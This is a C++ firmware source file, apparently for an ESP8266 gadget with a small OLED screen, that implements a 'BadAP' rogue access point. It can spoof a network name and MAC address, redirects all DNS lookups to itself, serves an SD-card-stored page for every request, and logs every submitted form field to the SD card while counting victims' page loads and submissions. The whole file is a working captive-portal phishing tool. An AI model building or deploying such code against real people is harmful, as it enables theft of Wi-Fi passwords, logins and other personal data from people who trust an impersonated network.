#include "badAP.h"

extern Adafruit_SSD1306 display;
extern bool awaitingExit;

namespace {
    AsyncWebServer server(80);
    DNSServer dnsServer;

    const byte DNS_PORT = 53;

    int pageLoadCount = 0;
    int dataReceivedCount = 0;

    void setupAP(const String &ssid, const String &mac, int channel, const String &code, const String &apName) {
        WiFi.mode(WIFI_AP);

        if (mac != "") {
            uint8_t macChar[6];
            for (int i = 0; i < 6; i++) {
                char buf[3] = { mac[2*i], mac[2*i + 1], 0 };
                unsigned int byteVal;
                sscanf(buf, "%02X", &byteVal);
                macChar[i] = (uint8_t)byteVal;
            }
            wifi_set_macaddr(SOFTAP_IF, macChar);
        }

        WiFi.softAP(ssid.c_str(), nullptr, channel);

        dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

        server.on("/", HTTP_GET, [code](AsyncWebServerRequest *request){
            request->send(200, "text/html", code);
            pageLoadCount++;
        });

        server.onNotFound([code](AsyncWebServerRequest *request) {
            request->send(200, "text/html", code);
            pageLoadCount++;
        });

        server.on("/", HTTP_POST, [apName](AsyncWebServerRequest *request){
            String saveData[MAX_PARAMS];
            int paramCount = 0;
            for (int i = 0; i < request->params() && i < MAX_PARAMS; i++) {
                AsyncWebParameter* p = request->getParam(i);
                saveData[i] =  p->name() + ": " + p->value();
                paramCount++;
            }
            SDManager::logData(apName, saveData, paramCount);
            request->send(200, "text/html", "<html><body>Thanks</body></html>");
            dataReceivedCount++;
        });

        server.begin();
    }

    void stopServer() {
        server.end();
        dnsServer.stop();

        pageLoadCount = 0;
        dataReceivedCount = 0;
    }

    void handleDNS() {
        dnsServer.processNextRequest();
    }
}

bool BadAPDisplay::scanInputs() {
    bool buttonPressed = false;

    if (digitalRead(FIRST_BUTTON) == LOW) {
        awaitingExit = true;
        onExit();
        buttonPressed = true;
    }
    if (digitalRead(SECOND_BUTTON) == LOW) {
        if (screenStage == ScreenStage::menu) {
            String ssid;
            String mac;
            int channel;
            String code;

            if (SDManager::loadAP(aps[index], ssid, mac, channel, code)) {
                screenStage = ScreenStage::servingPage;
                setupAP(ssid, mac, channel, code, aps[index]);
            }
        } else if (screenStage == ScreenStage::servingPage) {

        }
        buttonPressed = true;
    }
    if (digitalRead(THIRD_BUTTON) == LOW) {
        if (screenStage == ScreenStage::menu) {
            index = (index + 1) % apsLoaded;
            buttonPressed = true;
        }
    }

    return buttonPressed;
}

void BadAPDisplay::displayScreen() {
    display.clearDisplay();

    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0);

    if (screenStage == ScreenStage::menu) {
        int start = (index >= 6 ? index - 5 : 0);
        for (int i = start; i < apsLoaded; i++) {
            int row = i - start;

            if (index == i) {
                display.fillRect(0, (row * 10), 118, 10, SSD1306_WHITE);
                display.setTextColor(SSD1306_BLACK);
            } else {
                display.setTextColor(SSD1306_WHITE);
            }

            display.setCursor(1, (row * 10) + 1);
            display.print(aps[i]);
        }
    } else if (screenStage == ScreenStage::servingPage) {
        display.println(aps[index]);
        display.println("Page loaded " + String(pageLoadCount) + " times");
        display.println("Data received " + String(dataReceivedCount) + " times");
    }

    renderSidebar(Icon::ANTENNA_TOWER, Icon::RIGHT_ARROW, Icon::TARGET, Icon::DOWN_ARROW, -99);

    display.display();
}

void BadAPDisplay::onEnter() {
    apsLoaded = SDManager::listAPs(aps, MAX_APS);

    screenStage = ScreenStage::menu;
}

void BadAPDisplay::onExit() {
    stopServer();
}

void BadAPDisplay::tick() {
    handleDNS();
}